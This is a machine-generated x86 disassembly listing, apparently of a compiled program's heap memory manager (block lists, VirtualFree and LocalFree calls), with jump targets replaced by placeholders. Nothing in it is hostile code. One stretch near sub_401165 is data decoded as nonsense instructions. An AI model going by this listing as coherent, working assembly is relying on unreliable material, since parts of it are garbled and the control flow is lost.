sub_401143
dec esp
add [ esp + 0x4 ] 0xfffffff8
jmp r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_40330c
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_401165
inc ebp
adc [ eax ] eax
dec edi
adc [ eax ] eax
pop ecx
adc [ eax ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
adc [ gs : eax ] eax
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
adc [ eax ] eax
or al 0x0
add [ eax ] al
mov al [ 0xffffffff88004010 ]
xor al 0x40
add [ esi + edx * 2 + 0x40 ] cl
add [ eax + 0x56 ] bl
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
add [ eax + 0x56 ] ch
inc eax
add [ edx + esi ] cl
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ecx ] dl
push esp
dec ecx
outsb
je r-xdata
inc eax
add [ ecx + 0x11 ] dh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sar bh 0x25
jb r-xdata
mov ah 0xa1
inc esi
add [ ebx - 0x4fda0040 ] cl
mov eax [ 0xffffffffc08b0046 ]
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
sub_401370
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call sub_401330
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_4013c8
push ebx
push esi
mov esi edx
mov ebx eax
call sub_401370
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_401410
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
add eax [ esi + 0x4 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax ebx
call sub_4013f8
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_4013f8
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ esi ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jne r-xdata
mov edx esi
mov eax ebp
call sub_4013c8
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_401480
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx esi
mov edi [ edx + 0x4 ]
add ecx edi
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
mov edi [ ebx + 0x8 ]
add edi [ ebx + 0xc ]
sub edi ecx
mov [ esp + 0x4 ] edi
sub esi eax
mov [ ebx + 0xc ] esi
mov edx esp
mov eax ebx
call sub_4013c8
test al al
jne r-xdata
sub [ ebx + 0xc ] edi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_4013f8
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_401514
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013c8
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call sub_401340
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_401578
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call sub_401340
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call sub_401340
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_4013c8
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_4015f0
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call VirtualFree
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_4013f8
mov [ rw-data ] 0x1
sub_4016a8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call sub_401340
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_40173c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call VirtualFree
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_4017bc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_401514
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_4016a8
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_401410
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_4015f0
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_4013f8
jmp r-xdata
sub_40184c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_401578
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401410
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_401578
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_4015f0
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_401410
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_4016a8
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_4015f0
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_4013f8
jmp r-xdata
sub_401970
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_40173c
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_401410
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_4015f0
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_401480
jmp r-xdata
sub_4019fc
push ebp
mov ebp esp
xor edx edx
push ebp
push sub_401ab2
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call sub_401350
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_4013c0
mov eax rw-data
call sub_4013c0
mov eax rw-data
call sub_4013c0
push 0xff8
push 0x0
call sub_401330
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_401358
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401ab9
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call sub_401360
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_401ac0
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push sub_401b96
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call sub_401358
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call VirtualFree
mov ebx [ ebx ]
mov eax rw-data
call sub_4013c0
mov eax rw-data
call sub_4013c0
mov eax rw-data
call sub_4013c0
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_401368
retn
push rw-data
call sub_401360
sub_401ba0
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_401c04
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_401c34
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_401e08
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_401c88
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_401c64
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_401cb0
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_401ba0
add ebx esi
mov [ rw-data ] 0x6
sub_401d20
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_401ba0
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_401d58
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov [ esp ] 0x0
mov eax esi
call sub_401c04
mov ebx eax
test ebx ebx
je r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
lea ecx [ esp + 0x1 ]
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_401970
lea ecx [ esp + 0x1 ]
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_401970
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_401c34
mov eax ebp
add eax [ esp + 0x5 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
mov ebp [ esp + 0x1 ]
test ebp ebp
je r-xdata
lea edx [ esp + 0x1 ]
mov eax ebx
call sub_401480
mov [ esp ] 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_401c88
sub_401e08
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_401d58
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_401e90
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_401c64
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_401edc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
call sub_401e90
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_401410
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_401cb0
sub [ edi ] eax
add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_401d20
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_401c34
sub [ edi + 0x4 ] 0x4
sub_401f68
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_4017bc
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401edc
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_401f94
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_40184c
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401edc
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_401fc8
xor edx edx
test eax eax
jns r-xdata
sar eax 0x2
cmp eax 0x400
jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_401ff4
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_401ba0
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_401e08
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_401f68
test al al
jne r-xdata
mov eax esi
call sub_401fc8
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_4020e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x7ffffff8
jle r-xdata
call sub_4019fc
test al al
je r-xdata
xor ecx ecx
push ebp
push sub_402264
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call sub_401358
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
mov eax ebx
call sub_401ff4
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call sub_401360
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403a78
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
mov ecx ebx
test ecx ecx
jns r-xdata
mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403a78
jmp r-xdata
sub_402278
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_40240a
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_4019fc
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call sub_401358
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
and ebx 0x7ffffffc
mov eax esi
add eax ebx
mov edi eax
cmp edi [ rw-data ]
jne r-xdata
mov eax esi
sub eax 0xc
mov edx [ eax + 0x8 ]
cmp edx 0xc
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
test dl 0x2
je r-xdata
sub [ rw-data ] ebx
add [ rw-data ] ebx
cmp [ rw-data ] 0x3c00
jle r-xdata
mov [ rw-data ] 0xa
jmp r-xdata
test edx 0x80000003
je r-xdata
retn
push rw-data
call sub_401360
mov eax edi
cmp [ eax + 0x4 ] 0x0
je r-xdata
and edx 0x7ffffffc
cmp edx 0x4
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
call sub_403a78
jmp r-xdata
call sub_401e90
mov eax esi
sub eax edx
cmp edx [ eax + 0x8 ]
je r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
or [ eax ] 0x1
jmp r-xdata
mov [ rw-data ] 0xb
jmp r-xdata
add ebx edx
mov esi eax
call sub_401ba0
mov [ rw-data ] 0xa
jmp r-xdata
cmp [ eax + 0x8 ] 0xc
jge r-xdata
mov edx ebx
mov eax esi
call sub_401e08
